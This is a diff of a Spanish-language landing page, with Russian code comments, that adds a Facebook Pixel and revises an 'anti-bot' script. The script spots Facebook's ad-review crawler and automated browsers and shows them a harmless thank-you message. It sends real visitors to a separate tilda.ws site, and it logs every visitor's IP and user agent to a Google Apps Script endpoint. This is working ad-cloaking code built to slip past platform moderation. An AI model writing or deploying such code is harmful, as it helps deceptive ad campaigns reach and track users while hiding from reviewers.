@@ -11,50 +11,59 @@
 <body>
   <h1>Bienvenido</h1>
 
+  <!-- Facebook Pixel -->
+  <script>
+    !function(f,b,e,v,n,t,s){
+      if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src=v;s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)
+    }(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', 'ВАШ_PIXEL_ID');
+    fbq('track', 'PageView');
+  </script>
+  <noscript>
+    <img height="1" width="1" style="display:none"
+         src="https://www.facebook.com/tr?id=ВАШ_PIXEL_ID&ev=PageView&noscript=1"/>
+  </noscript>
+
+  <!-- Антибот -->
   <script>
     async function detect() {
       const ua = navigator.userAgent || '';
-      const lang = navigator.language || '';
-      const width = screen.width || 0;
       const webdriver = navigator.webdriver ? '1' : '0';
 
       const suspiciousUAs = [/bot/i, /crawl/i, /spider/i, /facebookexternalhit/i];
       const isUASuspicious = suspiciousUAs.some(rx => rx.test(ua));
-      const isLangSuspicious = !lang.toLowerCase().includes('es');
-      const isScreenSuspicious = width < 300 || width > 2000;
 
-      let ip = '_', country = '_';
+      let ip = '_';
       try {
-        const res = await fetch('https://ipapi.co/json/');
+        const res = await fetch('https://api.ipify.org?format=json');
         const json = await res.json();
-        ip = json.ip || '_';
-        country = json.country || '_';
+        ip = json.ip;
       } catch (e) {}
 
-      const isBot =
-        webdriver === '1' ||
-        isUASuspicious ||
-        isLangSuspicious ||
-        isScreenSuspicious ||
-        country !== 'AR';
+      const isBot = webdriver === '1' || isUASuspicious;
 
-      fetch('https://script.google.com/macros/s/AKfycbzeF5L5c3qDt5DSzQ6Cuv2FMLanBviy-9aMl-J5WxelYIxraRZrIM042UAr3g8mh6gJ-g/exec', {
+      // лог в Google Sheets
+      fetch('https://script.google.com/macros/s/AKfycbzD5oInQ5F1ibaYjFpPoKH477Pnfcz-KFboqeZLB87R_xRPigwneJdsyPMKxmr-o1WrJg/exec', {
         method: 'POST',
         body: JSON.stringify({
           ip,
-          country,
           ua,
-          lang,
-          width,
           webdriver,
           result: isBot ? 'bot' : 'ok'
         })
       });
 
+      // Редирект, если не бот
       if (!isBot) {
         setTimeout(() => {
           window.location.href = 'http://argentinaforreal.tilda.ws/';
-        }, 1200);
+        }, 1000);
       } else {
         document.querySelector('h1').textContent = 'Gracias por visitar';
       }
